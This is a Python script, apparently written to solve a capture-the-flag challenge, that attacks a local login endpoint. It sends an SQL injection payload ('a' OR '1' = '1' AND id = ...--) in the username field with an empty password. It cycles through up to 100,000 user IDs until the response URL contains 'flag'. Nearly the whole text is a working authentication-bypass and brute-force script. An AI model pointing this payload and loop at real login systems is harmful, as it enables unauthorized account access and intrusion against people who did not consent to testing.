import requests

# Configuration for your challenge
URL = "http://127.0.0.1:5000/api/login"  # Update this URL to your challenge's login endpoint
TOTAL_IDS = 100000  # Assuming the total possible IDs based on your users array

def attempt_login_with_id(user_id):
    # Prepare the data payload for the POST request with the SQL injection
    data = {
        "user": f"a' OR '1' = '1' AND id = {user_id}--",
        "pass": ""  # Assuming the password is not needed due to the SQL injection
    }
    
    # Send the POST request
    response = requests.post(URL, data=data)
    print(response.url)
    # Check if the response indicates a successful admin login
    if "flag" in response.url:
        print(f"Success with ID {user_id}: {response.url}")
        return True
    else:
        print(f"Attempt with ID {user_id} did not succeed.")
        return False

# Iterate over all possible IDs and attempt to log in
for user_id in range(1, TOTAL_IDS + 1):  # IDs are 1-indexed based on your description
    if attempt_login_with_id(user_id):
        break  # Stop the loop if we successfully log in as an admin
